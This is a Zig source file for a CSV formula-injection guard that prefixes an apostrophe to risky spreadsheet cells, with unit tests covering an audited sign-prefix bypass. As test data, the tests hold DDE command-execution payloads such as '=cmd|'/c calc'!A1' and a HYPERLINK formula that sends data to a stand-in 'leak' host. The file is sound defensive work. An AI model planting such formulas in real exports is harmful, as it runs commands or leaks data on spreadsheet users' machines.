// SPDX-License-Identifier: MIT
//! csvsafe — OWASP CSV formula-injection guard, and nothing else.
//!
//! A spreadsheet (Excel, LibreOffice Calc, Google Sheets) treats a cell whose
//! first character is `=`, `+`, `-`, `@`, or a leading tab/CR as a *formula*
//! and will evaluate it — the DDE/`cmd|'/c calc'!A1` class of attack. The guard
//! neutralizes such a cell by prefixing a single apostrophe (`'`), which forces
//! the spreadsheet to render the cell as literal text.
//!
//! Signed-number exception: `+` and `-` also legitimately lead a number
//! (`-12.34`, `+5`, `+.5`) or a `+`-prefixed international phone number
//! (`+420 555 0101`). Prefixing those would corrupt the value, so a `+`/`-`
//! lead is guarded ONLY when the following byte is not a digit or the decimal
//! separator — i.e. only when it is actually a formula/comment lead
//! (`+SUM(...)`, `-- comment`, a lone `+`).
//!
//! Scope is deliberately ONE concern. This module does NOT quote (RFC 4180)
//! and does NOT remap decimal separators — those belong to the CSV writer /
//! csvstream consumer. See README "DEFER".

const std = @import("std");

pub const meta = .{
    .platform = .any,
    .role = .util,
    .concurrency = .reentrant,
    .model_after = "OWASP CSV Injection prevention",
    .deps = .{},
};

/// The byte prepended to a dangerous cell to neutralize it. An apostrophe is
/// the spreadsheet-standard "treat the rest of this cell as literal text" lead.
pub const guard_char: u8 = '\'';

/// Default decimal separator used to recognize a legitimate signed number
/// (`+.5`, `-.5`). Callers whose locale uses `,` as the decimal separator pass
/// their own via `needsGuardSep` / `writeSafeSep`.
pub const default_decimal_sep: u8 = '.';

/// Returns true if `value` would be interpreted as a formula by a spreadsheet
/// and therefore needs the guard prefix. Uses `default_decimal_sep` ('.') to
/// recognize a legitimate signed number.
pub fn needsGuard(value: []const u8) bool {
    return needsGuardSep(value, default_decimal_sep);
}

/// Like `needsGuard`, but recognizes a signed number using the caller's
/// `decimal_sep` (e.g. ',' for locales that write `-12,34`).
pub fn needsGuardSep(value: []const u8, decimal_sep: u8) bool {
    if (value.len == 0) return false;
    return switch (value[0]) {
        '=', '@', '\t', '\r' => true,
        // A '+' / '-' lead is a signed *number* (safe, passes unguarded) ONLY
        // when it is a signed number all the way through; otherwise it is a
        // formula and must be guarded.
        '+', '-' => !isSignedNumber(value, decimal_sep),
        else => false,
    };
}

/// A leading '+'/'-' introduces a signed *number* — safe to pass unguarded —
/// only when EVERY following byte is a digit, the decimal separator, or a space
/// (digit grouping / phone numbers). A value that reaches a formula operator,
/// letter, another sign or any other byte is an Excel/Sheets formula
/// (e.g. "-1+cmd|'/c calc'!A1") and must be guarded — checking only the first
/// byte after the sign let that whole injection class through (audit F1). Since
/// a run of only digits/sep/space cannot contain a formula operator, function
/// name or cell reference, it is provably not executable. A lone sign (len < 2)
/// is not a number and stays guarded.
fn isSignedNumber(value: []const u8, decimal_sep: u8) bool {
    if (value.len < 2) return false;
    // The byte right after the sign must be a digit or the locale decimal
    // separator (preserves the original signed-number/locale semantics, e.g.
    // "-.5" under a ',' locale is not a number).
    if (!std.ascii.isDigit(value[1]) and value[1] != decimal_sep) return false;
    // ...AND the ENTIRE remainder must be numeric punctuation only. A run of
    // digits / separators / spaces cannot contain a formula operator, function
    // name or cell reference, so it is provably not executable; anything else
    // (e.g. the "+cmd|..." tail of "-1+cmd|'/c calc'!A1") forces a guard (F1).
    for (value[1..]) |ch| {
        const numeric = std.ascii.isDigit(ch) or ch == decimal_sep or
            ch == '.' or ch == ',' or ch == ' ';
        if (!numeric) return false;
    }
    return true;
}

/// Writes `value` to `writer`, prefixing the guard char first if `value` would
/// be read as a formula. This is the injection guard ONLY: no quoting, no
/// decimal-separator remapping, no other byte-level transformation — the cell's
/// bytes are written verbatim after the (conditional) prefix.
pub fn writeSafe(writer: *std.Io.Writer, value: []const u8) std.Io.Writer.Error!void {
    return writeSafeSep(writer, value, default_decimal_sep);
}

/// Like `writeSafe`, but recognizes a signed number using `decimal_sep`.
pub fn writeSafeSep(
    writer: *std.Io.Writer,
    value: []const u8,
    decimal_sep: u8,
) std.Io.Writer.Error!void {
    if (needsGuardSep(value, decimal_sep)) try writer.writeByte(guard_char);
    try writer.writeAll(value);
}

/// Allocates and returns a guarded copy of `value`. The result is either an
/// owned copy of `value` (safe) or `guard_char ++ value` (dangerous). The
/// caller owns and frees the returned slice. Uses `default_decimal_sep`.
pub fn guard(alloc: std.mem.Allocator, value: []const u8) std.mem.Allocator.Error![]u8 {
    return guardSep(alloc, value, default_decimal_sep);
}

/// Like `guard`, but recognizes a signed number using `decimal_sep`.
pub fn guardSep(
    alloc: std.mem.Allocator,
    value: []const u8,
    decimal_sep: u8,
) std.mem.Allocator.Error![]u8 {
    if (!needsGuardSep(value, decimal_sep)) return alloc.dupe(u8, value);
    const out = try alloc.alloc(u8, value.len + 1);
    out[0] = guard_char;
    @memcpy(out[1..], value);
    return out;
}

// ── Tests ────────────────────────────────────────────────────────────────

const testing = std.testing;

/// Drives `writeSafe` through a fixed buffer and asserts the emitted bytes.
fn expectSafe(value: []const u8, expected: []const u8) !void {
    var buf: [256]u8 = undefined;
    var w = std.Io.Writer.fixed(&buf);
    try writeSafe(&w, value);
    try testing.expectEqualStrings(expected, w.buffered());
}

/// Drives `writeSafeSep` (custom decimal separator) through a fixed buffer
/// and asserts the emitted bytes.
fn expectSafeSep(value: []const u8, decimal_sep: u8, expected: []const u8) !void {
    var buf: [256]u8 = undefined;
    var w = std.Io.Writer.fixed(&buf);
    try writeSafeSep(&w, value, decimal_sep);
    try testing.expectEqualStrings(expected, w.buffered());
}

// ── Formula-injection guard tests ──────────────

test "writeSafe: formula-injection leads get an apostrophe guard" {
    // OWASP CSV-injection set: '=', '+', '@', tab (and CR) all open a formula
    // in Excel/LibreOffice; prefix with ' so the cell renders as literal text.
    try expectSafe("=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1");
    try expectSafe("@SUM(A1:A9)", "'@SUM(A1:A9)");
    try expectSafe("+cmd|'/c calc'!A1", "'+cmd|'/c calc'!A1");
    try expectSafe("\t=1+1", "'\t=1+1");
}

test "writeSafe: signed numbers are not mangled by the guard" {
    // '+' and '-' legitimately lead a number; prefixing would make a consumer
    // parse them as strings. Both must pass through when the next char is a
    // digit or the decimal separator.
    try expectSafe("-12.34", "-12.34");
    try expectSafe("+5", "+5");
    try expectSafe("+.5", "+.5");
    try expectSafe("-.5", "-.5");
    try expectSafe("+420 555 0101", "+420 555 0101"); // intl phone number
}

test "writeSafe: non-numeric +/- leads are still guarded" {
    // A '+'/'-' followed by a non-digit is an injection pattern, not a number.
    try expectSafe("+SUM(A1:A9)", "'+SUM(A1:A9)");
    try expectSafe("-- comment", "'-- comment");
    try expectSafe("+", "'+"); // lone sign: safe default
    try expectSafe("-", "'-");
}

test "writeSafe: a signed-number lead followed by a formula tail is guarded (audit F1 HIGH)" {
    // Batch-10 audit HIGH: needsGuard inspected only the byte after the sign, so a
    // number immediately followed by a formula ("-1+cmd|...") slipped through
    // unguarded even though Excel/Sheets evaluate the whole cell as a formula. The
    // signed-number exception now requires the entire tail to be numeric.
    try expectSafe("-1+cmd|'/c calc'!A1", "'-1+cmd|'/c calc'!A1");
    try expectSafe("+1+cmd|'/c calc'!A1", "'+1+cmd|'/c calc'!A1");
    try expectSafe("-1e9", "'-1e9"); // scientific notation over-guarded (safe direction)
    // Genuine signed numbers (incl. grouped/phone) still pass through unchanged:
    try expectSafe("-12.34", "-12.34");
    try expectSafe("+420 555 0101", "+420 555 0101");
}

test "writeSafe: guards the OWASP WSTG's own test payloads (F2 external anchor)" {
    // External anchor, not self-authored: these five payloads are the exact
    // "Formula-Triggering Prefixes" test values published by the OWASP Web
    // Security Testing Guide's own "Testing for CSV Injection" page —
    //   https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/21-Testing_for_CSV_Injection
    //   (section "Place Benign, Detectable Formula-Like Values into Candidate
    //   Fields", fetched live 2026-08-09) — reproduced byte-for-byte, not
    //   reworded or invented. `+1+1` and `-1+1` are also, incidentally, the
    //   OWASP corpus independently landing on the exact `[+-]<digit><formula>`
    //   shape audit F1 (above) fixed a bypass for.
    try expectSafe("=1+1", "'=1+1");
    try expectSafe("+1+1", "'+1+1");
    try expectSafe("-1+1", "'-1+1");
    try expectSafe("@SUM(1,1)", "'@SUM(1,1)");
    try expectSafe(
        "=HYPERLINK(\"http://example.invalid/leak?test=1\", \"Click Me\")",
        "'=HYPERLINK(\"http://example.invalid/leak?test=1\", \"Click Me\")",
    );
}

// ── Added cases ────────────────────────────────────────────────────────────

test "writeSafe: each dangerous lead char individually" {
    try expectSafe("=1", "'=1");
    try expectSafe("@x", "'@x");
    try expectSafe("\tx", "'\tx"); // leading tab
    try expectSafe("\rx", "'\rx"); // leading CR
    // '+' / '-' followed by a non-numeric byte:
    try expectSafe("+a", "'+a");
    try expectSafe("-a", "'-a");
}

test "writeSafe: benign cells pass through unchanged" {
    try expectSafe("", ""); // empty cell
    try expectSafe("hello", "hello"); // normal text
    try expectSafe("Acme Corp", "Acme Corp");
    try expectSafe("100", "100"); // bare number
    try expectSafe("a=b", "a=b"); // '=' not in lead position
    try expectSafe("x\ty", "x\ty"); // tab not in lead position
}

test "needsGuard predicate matches writeSafe behavior" {
    try testing.expect(needsGuard("=x"));
    try testing.expect(needsGuard("@x"));
    try testing.expect(needsGuard("\tx"));
    try testing.expect(needsGuard("\rx"));
    try testing.expect(needsGuard("+SUM(1)"));
    try testing.expect(needsGuard("-- c"));
    try testing.expect(needsGuard("+"));
    try testing.expect(!needsGuard(""));
    try testing.expect(!needsGuard("-12.34"));
    try testing.expect(!needsGuard("+5"));
    try testing.expect(!needsGuard("+.5"));
    try testing.expect(!needsGuard("normal"));
}

test "writeSafeSep: the writer path itself honors a non-default decimal separator" {
    // Regression: writeSafeSep must consult the *passed* decimal_sep, not
    // just the predicate-level needsGuardSep (which was the only thing
    // previously exercised with a non-default separator).
    try expectSafeSep("-,5", ',', "-,5"); // comma-led decimal, comma locale: safe
    try expectSafeSep("-,5", '.', "'-,5"); // same value, '.' locale: not a number, guarded
}

test "needsGuardSep honors a comma decimal separator" {
    // With ',' as the decimal separator, "-12,34" is a signed number.
    try testing.expect(!needsGuardSep("-12,34", ','));
    try testing.expect(!needsGuardSep("+,5", ','));
    // But "-12.34" under a ',' locale: '.' is not the sep, yet the byte after
    // '-' is a digit, so it is still numeric and passes through.
    try testing.expect(!needsGuardSep("-12.34", ','));
    // A '.'-only lead under ',' locale is not numeric → guarded.
    try testing.expect(needsGuardSep("-.5", ','));
}

test "guard allocates a guarded or copied cell" {
    const a = testing.allocator;

    const dangerous = try guard(a, "=cmd");
    defer a.free(dangerous);
    try testing.expectEqualStrings("'=cmd", dangerous);

    const safe = try guard(a, "-12.34");
    defer a.free(safe);
    try testing.expectEqualStrings("-12.34", safe);
    // Result is an owned copy, distinct from the input pointer.
    try testing.expect(safe.ptr != "-12.34".ptr);

    const empty = try guard(a, "");
    defer a.free(empty);
    try testing.expectEqualStrings("", empty);
}

test "guardSep honors a non-default decimal separator" {
    const a = testing.allocator;

    // "-,5" is a safe signed number under a ',' locale...
    const safe = try guardSep(a, "-,5", ',');
    defer a.free(safe);
    try testing.expectEqualStrings("-,5", safe);

    // ...but under the default '.' locale, ',' isn't the separator, so it's
    // guarded.
    const dangerous = try guardSep(a, "-,5", '.');
    defer a.free(dangerous);
    try testing.expectEqualStrings("'-,5", dangerous);
}
